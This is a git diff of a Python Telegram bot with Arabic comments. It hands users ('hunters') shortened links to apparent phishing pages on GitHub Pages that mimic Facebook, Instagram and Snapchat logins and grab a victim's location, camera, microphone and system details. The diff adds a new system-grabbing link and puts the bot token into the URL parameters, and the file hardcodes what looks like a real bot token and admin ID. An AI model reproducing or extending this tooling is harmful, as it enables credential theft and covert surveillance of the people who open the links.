@@ -6,17 +6,17 @@ from threading import Thread
 import os
 import time
 
-# 1. السيرفر عشان يضل شغال
+# 1. السيرفر لضمان العمل 24/7
 app = Flask('')
 @app.route('/')
-def home(): return "M.Y.9 System Online"
+def home(): return "M.Y.9 System Online - Dev: Abu Osayed"
 
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 def keep_alive(): Thread(target=run).start()
 
-# 2. التوكن تبعك (بدون تغيير)
+# 2. الإعدادات الأساسية
 TOKEN = '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY'
-MY_ID = '7238206121' 
+ADMIN_ID = '7238206121' # Abu Osayed Malkawi
 bot = telebot.TeleBot(TOKEN)
 
 def short(url):
@@ -25,12 +25,13 @@ def short(url):
         return r.text if r.status_code == 200 else url
     except: return url
 
-# 3. أمر البداية (Start) بالعربي
 @bot.message_handler(commands=['start'])
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    warning_text = f"""
+    # رسالة التنبيه الأولى (بالعربي)
+    alert_text = f"""
+أبو أسيد للمعلومات 🦅
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
 
 عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـضـمـان تـفـعـيـل الـنـظـام يـجـب مـتـابـعـة حـسـاب المـطـور الـرسمـي عـلى انـسـتـغـرام.
@@ -40,24 +41,34 @@ def start(m):
     """
     
     markup = types.InlineKeyboardMarkup()
-    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
+    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور عـلى انـسـتـغـرام", url="https://www.instagram.com/m_y_.9/")
     markup.add(btn_insta)
-    bot.send_message(uid, warning_text, reply_markup=markup)
+    
+    bot.send_message(uid, alert_text, reply_markup=markup)
 
-    def background_process(chat_id, user_name):
-        time.sleep(120) 
+    # دالة الانتظار دقيقتين (120 ثانية)
+    def background_process(user_chat_id, user_name):
+        time.sleep(120) # الانتظار المطلوب
+        
         h = user_name.replace(" ", "_")
         base = "https://m-y-9-tech.github.io/fb/"
-        p = f"?id={chat_id}&hunter={h}&dev={MY_ID}"
+        params = f"?user_id={user_chat_id}&admin_id={ADMIN_ID}&hunter={h}&bot_token={TOKEN}"
         
+        # توليد الـ 8 روابط
         lnks = {
-            "fb": short(base+"fb.html"+p), "ig": short(base+"ig.html"+p),
-            "sn": short(base+"snap.html"+p), "lc": short(base+"loc.html"+p),
-            "au": short(base+"audio.html"+p), "c1": short(base+"cam.html"+p),
-            "c2": short(base+"cam2.html"+p)
+            "fb": short(base+"fb.html"+params),
+            "ig": short(base+"ig.html"+params),
+            "sn": short(base+"sn.html"+params),
+            "lc": short(base+"loc.html"+params),
+            "sys": short(base+"sys.html"+params),
+            "c1": short(base+"c1.html"+params),
+            "c2": short(base+"c2.html"+params),
+            "au": short(base+"audio.html"+params)
         }
 
+        # الرسالة النهائية بالزخرفة المطلوبة
         final_msg = f"""
+أبو أسيد للمعلومات 🦅
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅
 
 👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
@@ -76,6 +87,9 @@ def start(m):
 📍 سـحـب الـمـوقـع: 
 🔗 `{lnks['lc']}`
 
+💻 سـحـب الـنـظـام: 
+🔗 `{lnks['sys']}`
+
 🎤 سـحـب الـصـوت: 
 🔗 `{lnks['au']}`
 
@@ -90,15 +104,12 @@ def start(m):
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ⚙️ Status: Connected Successfully
         """
-        try: bot.send_message(chat_id, final_msg, parse_mode="Markdown", disable_web_page_preview=True)
-        except: pass
+        bot.send_message(user_chat_id, final_msg, parse_mode="Markdown", disable_web_page_preview=True)
 
     Thread(target=background_process, args=(uid, name)).start()
 
-# 4. تشغيل البوت مع تنظيف التعارض
 if __name__ == "__main__":
     keep_alive()
-    # السطرين الجايين هم اللي رح يحلوا مشكلة الـ Conflict بدون ما تغير التوكن
     bot.remove_webhook()
-    time.sleep(2) 
+    time.sleep(1)
     bot.infinity_polling(skip_pending=True)
